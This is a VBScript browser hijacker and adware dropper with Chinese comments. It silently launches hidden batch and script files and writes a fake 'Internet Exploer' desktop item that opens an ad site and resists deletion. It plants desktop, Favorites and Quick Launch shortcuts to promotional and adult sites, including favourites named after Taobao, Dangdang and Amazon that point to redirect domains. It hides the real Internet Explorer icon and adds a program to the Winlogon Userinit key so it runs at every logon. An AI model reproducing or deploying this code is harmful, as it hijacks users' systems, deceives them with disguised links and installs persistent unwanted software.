Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'特殊文件夹“桌面”
Favorites = WshShell.SpecialFolders("Favorites") :'特殊文件夹“桌面”

on error resume next 

Rem
strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strWinDir&"\systemfiles\3.bat""",0
iescc=strWinDir&"\Internet Explorer\iexplore.exe"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\", "Internet Exploer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\DefaultIcon\", iescc
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\",""
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\", "删除(&D)"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\", "上网主页"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\复"&"制\", "复"&"制"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\复"&"制\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{86AEFBE8-763F-0647-899C-A93278894D8E}""\", "Internet Exploer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\",""


Rem 
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\千千体育直播.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www."&"77zb."&"com/?desk" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\淘宝网今日打折特价区.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www.223224.com/taobao/?desk" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\taobao.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\超级好玩小游戏.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www.45575.com/?desk" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\game.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oShellLink = WshShell.CreateShortcut(strDesktop & "\免费电影.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www.kuku46.com/?we2" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\kusila.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式

Set oShellLink = WshShell.CreateShortcut(Favorites & "\千千体育直播.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www."&"77zb."&"com/?fav" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.Hotkey = "" : '快捷键
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oShellLink = WshShell.CreateShortcut(Favorites & "\九品高清网络电视.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'程数
oShellLink.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink.Hotkey = "" : '快捷键
oShellLink.IconLocation = "%ProgramFiles%\systemfiles\9ptv.ico, 0" : '图标
oShellLink.Description = "" : '备注
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink.Save : '创建保存快捷方式
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\淘宝网 - 淘！我喜欢.url")
oUrlLink.TargetPath = "http://www."&"77zb."&"com/"&"taobao/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\易趣网 - 品质网购，乐在易趣.url")
oUrlLink.TargetPath = "http://www.82vv.com/yq/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\当当网 – 全球最大的中文网上书店&购物中心.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\卓越亚马逊网上购物图书，手机，数码，家电，化妆品，钟表，首饰等在线销售.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\看看电视剧，最新最好的绿色免费电视剧网站.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575在线小游戏，最好玩最快的小游戏.url")
oUrlLink.TargetPath = "http://www.45575.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\最新绿色免费电影！高速高清！天天更新！！！.url")
oUrlLink.TargetPath = "http://www.kuku46.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\极品美媚清纯写真！！美图大集合！.url")
oUrlLink.TargetPath = "http://www.ysr3.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\绝色人体艺术图！！请用艺术的眼光欣赏！.url")
oUrlLink.TargetPath = "http://mm.jiewen5.com/?fav"
oUrlLink.Save

WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\Attributes",10,"REG_DWORD"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\Command\", iescc&" http://www.552dh.cn/?ca1"


Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\超级好玩小游戏.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink1.Arguments = "http://www.45575.com/?desk" :'程数
oShellLink1.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\game.ico, 0" : '图标
oShellLink1.Description = "" : '备注
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink1.Save : '创建保存快捷方式
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\淘宝网今日打折特价区.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink1.Arguments = "http://www.223224.com/taobao/?desk" :'程数
oShellLink1.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\taobao.ico, 0" : '图标
oShellLink1.Description = "" : '备注
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink1.Save : '创建保存快捷方式
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\千千体育直播.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink1.Arguments = "http://www."&"77zb."&"com/?desk" :'程数
oShellLink1.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\77zb.ico, 0" : '图标
oShellLink1.Description = "" : '备注
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink1.Save : '创建保存快捷方式
Set oShellLink1 = WshShell.CreateShortcut(WshShell.SpecialFolders.Item("AppData")& "\Microsoft\Internet Explorer\Quick Launch"&"\免费电影.lnk")  
oShellLink1.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : '目标
oShellLink1.Arguments = "http://www.kuku46.com/?we2" :'程数
oShellLink1.WindowStyle = 1 :'参数1默认窗口激活，参数3最大化激活，参数7最小化
oShellLink1.IconLocation = "%ProgramFiles%\systemfiles\kusila.ico, 0" : '图标
oShellLink1.Description = "" : '备注
oShellLink1.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '起始位置
oShellLink1.Save : '创建保存快捷方式


'=========
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
WSHShell.SendKeys "{F5}"

createobject("wscript.shell").run """"&strWinDir&"\systemfiles\3.vbs""",0

WSHShell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",winds&"\system32\userinit.exe,"&strWinDir&"\systemfiles\sys32.exe"
wscript.quit